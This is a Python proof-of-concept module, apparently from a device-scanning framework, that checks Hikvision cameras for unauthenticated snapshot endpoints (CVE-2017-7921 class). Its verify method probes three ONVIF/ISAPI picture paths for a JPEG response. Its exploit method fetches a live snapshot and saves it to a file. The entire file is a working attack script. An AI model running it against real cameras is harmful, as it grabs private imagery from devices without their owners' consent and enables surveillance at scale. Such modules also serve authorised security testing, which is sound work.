"""Hikvision anonymous snapshot — common misconfig / leftover 2017-7921 class."""
from loguru import logger
from .base import POCTemplate


class HikvisionUnauthSnapshot(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product.get("hikvision", "hikvision")
        self.level = POCTemplate.level.medium
        self.desc = "Unauthenticated JPEG snapshot via ONVIF/ISAPI picture endpoints."

    def verify(self, ip, port=80):
        headers = {"User-Agent": self.config.user_agent}
        paths = (
            "/onvif-http/snapshot",
            "/ISAPI/Streaming/channels/101/picture",
            "/Streaming/channels/1/picture",
        )
        for path in paths:
            try:
                r = self.session.get(
                    self.url(ip, port, path),
                    headers=headers, timeout=self.config.timeout,
                    verify=False, stream=True)
                blob = r.content[:3] if r.content else b""
                if r.status_code == 200 and blob == b"\xff\xd8\xff":
                    return ip, str(port), self.product, "", "", self.name
            except Exception as e:
                logger.error(e)
        return None

    def exploit(self, results):
        ip, port = results[0], results[1]
        return self._snapshot(
            self.url(ip, port, "/onvif-http/snapshot"),
            f"{ip}-{port}-hikvision-unauth-snapshot.jpg")


POCTemplate.register_poc(HikvisionUnauthSnapshot)
